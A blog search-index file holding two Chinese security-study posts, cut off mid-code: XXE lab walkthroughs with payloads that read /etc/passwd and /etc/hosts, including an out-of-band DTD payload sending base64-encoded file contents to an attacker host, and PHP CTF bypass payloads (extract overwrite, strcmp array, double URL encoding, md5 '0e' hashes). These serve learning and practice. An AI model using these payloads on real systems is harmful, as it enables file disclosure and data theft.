<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xxe 学习</title>
    <link href="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="XML介绍"><a href="#XML介绍" class="headerlink" title="XML介绍"></a>XML介绍</h2><p>xml代表可扩展标记语言。标记语言是一组代码或标记，用于描述数字文档中的文本。最著名的标记语言是超文本标记语言(HTML)，用于格式化&#x2F;展示网页。xml被设计用来传输和存储数据，不用于表现和展示数据。</p><p>HTML标记是固定的，每个网站开发者都是用相同的标签来做相同的事情</p><p>而XML允许创建自己的标签来标记数据，XML的灵活性有很多好处，允许在公司数据库和网站之间传输数据，而不会丢失关键的描述性信息。其次，XML会使搜索更加高效，因为搜索引擎可以通过标签定位而不是长文本进行搜索。</p><h6 id="xml语法"><a href="#xml语法" class="headerlink" title="xml语法"></a>xml语法</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">persion</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Name</span>&gt;</span>Hmm<span class="hljs-tag">&lt;/<span class="hljs-name">Name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Age</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">Age</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">persion</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="DTD文档：用于定义合法的xml文档构建模块"><a href="#DTD文档：用于定义合法的xml文档构建模块" class="headerlink" title="DTD文档：用于定义合法的xml文档构建模块"></a>DTD文档：用于定义合法的xml文档构建模块</h6><p>实用方式：</p><p>1.内部声明DTD: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素[元素声明]&gt;</span><br></code></pre></td></tr></table></figure><p>2.外部引用DTD: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;外部DTD的url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3.引用公共DTD: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;DTD标识名&quot;</span> <span class="hljs-string">&quot;公用的DTD的url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="xml实体"><a href="#xml实体" class="headerlink" title="xml实体"></a>xml实体</h6><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该实体的值。实体根据引用的方式，还可以分为内部实体与外部实体，看看这些实体的申明方式。</p><h6 id="普通实体-在XML文档中"><a href="#普通实体-在XML文档中" class="headerlink" title="普通实体(在XML文档中)"></a>普通实体(在XML文档中)</h6><p>在xml文档中调用  &amp;实体名字</p><ul><li>内部实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-string">&quot;实体的值&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;url&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><h6 id="参数实体-用在DTD文档中"><a href="#参数实体-用在DTD文档中" class="headerlink" title="参数实体(用在DTD文档中)"></a>参数实体(用在DTD文档中)</h6><p>在DTD文档中 %实体名字</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY %实体名称 <span class="hljs-string">&quot;实体的值&quot;</span> &gt;</span><br>或者<br><span class="hljs-meta">&lt;!ENTITY %实体名称 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;url&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><h6 id="XML实体实例演示"><a href="#XML实体实例演示" class="headerlink" title="XML实体实例演示"></a>XML实体实例演示</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">name</span> <span class="hljs-string">&quot;idea&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-symbol">&amp;name;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml verison=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY %name <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%name;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><h2 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h2><p>XML外部实体注入，简称XXE漏洞。xxe是针对解析xml输入的应用程序的一种攻击。当弱配置的xml解析器处理包含对外部实体的引用的xml输入时，就会发生此攻击。</p><h4 id="实验1（pikachu靶场）"><a href="#实验1（pikachu靶场）" class="headerlink" title="实验1（pikachu靶场）"></a>实验1（pikachu靶场）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-string">&quot;test&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;hacker;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109132427881.png" alt="image-20240109132427881"></p><p>我在框中提交上面的xml</p><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109132500459.png" alt="image-20240109132500459"></p><p>发现是被成功解析了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109132956081.png" alt="image-20240109132956081"></p><h4 id="实验2-xxe-lad"><a href="#实验2-xxe-lad" class="headerlink" title="实验2 (xxe-lad)"></a>实验2 (xxe-lad)</h4><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109133731626.png" alt="image-20240109133731626"></p><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109134424838.png" alt="image-20240109134424838"></p><p>Payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/hosts&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin888<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109134832042.png" alt="image-20240109134832042"></p><p>以上都是有回显的，那么在没有回显的情况下，可以通过OOB带外注入的方法通过外带数据通道来提取数据，构造payload如下</p><p>还是上述实验代码</p><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109140338577.png" alt="image-20240109140338577"></p><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109140439907.png" alt="image-20240109140439907"></p><p>可以看到没有结果了</p><p>构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///读取的文件&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://attcker_ip/a.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br><br><br><br><br>攻击者远程部署的a.dtd文档中的内容为:<br><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://攻击者ip:端口号?%file;&#x27;&gt;&quot;</span>&gt;</span><br>%start;<br></code></pre></td></tr></table></figure><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109152505247.png" alt="image-20240109152505247"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -m http.server <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p>启动一个http服务</p><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109152543829.png" alt="image-20240109152543829"></p><p>在目标上的payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/hosts&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.34.46:7777/a.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>发送payload</p><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109152336493.png" alt="image-20240109152336493"></p><p>然后查看我们监听的端口</p><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109152608681.png" alt="image-20240109152608681"></p><p>将内容base64解码即可</p><p><img src="/2024/01/09/xxe-%E5%AD%A6%E4%B9%A0/xxe%E5%AD%A6%E4%B9%A0/image-20240109152633220.png" alt="image-20240109152633220"></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php ctf代码审计题</title>
    <link href="/2024/01/08/php-ctf%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/php-ctf%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/"/>
    <url>/2024/01/08/php-ctf%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/php-ctf%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="代码审计题目"><a href="#代码审计题目" class="headerlink" title="代码审计题目"></a>代码审计题目</h2><ul><li><h4 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract 变量覆盖"></a>extract 变量覆盖</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))<br>&#123;<br><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;xxx&#125;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">将通过GET传过来的数组转为一个名为数组名，值为数组值的变量(如果新的变量和已有变量重名，会将已有变量替换)<br>如果存在一个名叫shiyan的字符串<br>将flag变量的值赋给名为content变量<br>如果变量shiyan和变量content的值相同，<br>就输出flag的值<br>否则就输出Oh,no<br>因为extract()会把符号表中已存在的变量名的值替换掉，所以制造Payload ：?shiyan=&amp;flag=<br>也就是利用新传入的值为空的flag替换原有的flag的值。构造空等于空，成功输出flag的值<br></code></pre></td></tr></table></figure></li><li><h4 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>) /如果 str1 小于 str2 返回 &lt; <span class="hljs-number">0</span>； 如果 str1大于 str2返回 &gt; <span class="hljs-number">0</span>；如果两者相等，返回 <span class="hljs-number">0</span>。<br>/比较两个字符串（区分大小写）<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析：<br>就是get 用a和flag比较。<br>这里strcmp有一个bug就是如果比较的是数组的话，还是会返回一个0。<br>所以使用payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a[]=1<br></code></pre></td></tr></table></figure></li><li><h4 id="URLDECOD二次编码"><a href="#URLDECOD二次编码" class="headerlink" title="URLDECOD二次编码"></a>URLDECOD二次编码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析：<br>首先我们想到的是二次转码，浏览器转码一次，然后urldecode转码一次，那么我们就可以利用%25，转码之后就是%，那么我们只要找到字母的url编码就可以成功绕过了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=%2568%2561ckerDJ<br></code></pre></td></tr></table></figure><p>所有字符url编码两次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61<br></code></pre></td></tr></table></figure></li><li><h4 id="MD5函数"><a href="#MD5函数" class="headerlink" title="MD5函数"></a>MD5函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解析：<br>看到是md5函数，简单搜索一下关于md5()的缺陷，发现，原来md5没有办法处理数组格式的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username[]=1&amp;password[]=2<br></code></pre></td></tr></table></figure><p>当题目为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>为弱类型比较</p><p>在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，结果均为0，因此在比较两个以 <code>0e</code> 开头的字符串时，无论后面的字符时是什么，比较结果都为 True</p><p>常用 MD5 值以 <code>0e</code> 开头的字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">QNKCDZO<span class="hljs-number">0e830400451993494058024219903391</span><br>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span><br>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span><br>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span><br>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span><br>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span><br>s1091221200a<span class="hljs-number">0e940624217856561557816327384675</span><br></code></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=QNKCDZO&amp;b=s878926199a<br></code></pre></td></tr></table></figure></li><li><h4 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span 